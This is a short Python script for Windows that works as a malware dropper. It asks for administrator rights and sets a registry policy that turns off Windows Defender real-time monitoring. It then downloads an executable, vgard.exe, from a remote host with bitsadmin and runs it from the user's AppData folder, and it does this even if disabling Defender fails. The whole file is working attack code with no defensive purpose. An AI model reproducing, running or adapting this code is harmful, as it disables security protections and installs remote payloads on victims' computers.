import os
import ctypes
import subprocess
import time
import sys
import winreg as reg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_defender_temporarily():
    try:
        reg_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"

        reg_key = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, reg_path, 0, reg.KEY_WRITE)

        reg.SetValueEx(reg_key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)

        reg.CloseKey(reg_key)

        print("Windows Defender Tango Down")

        start_payload()
    except Exception as e:
        print(f"error: {e}")
        start_payload()

def start_payload():
    subprocess.call("bitsadmin /transfer mydownloadjob /download /priority FOREGROUND http://gem.kro.kr:2222/vgard.exe %appdata%\\vgard.exe", shell=True)
    subprocess.Popen("%appdata%\\vgard.exe", shell=True)

if __name__ == "__main__":
    if not is_admin():
        print("Requesting administrative privileges...")
        try:
            script = os.path.abspath(sys.argv[0])
            
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
            sys.exit(0)
        except Exception as e:
            print(f"Failed to obtain admin privileges: {e}")
            sys.exit(1)
    else:
        print("Running with administrative privileges.")
        disable_defender_temporarily()
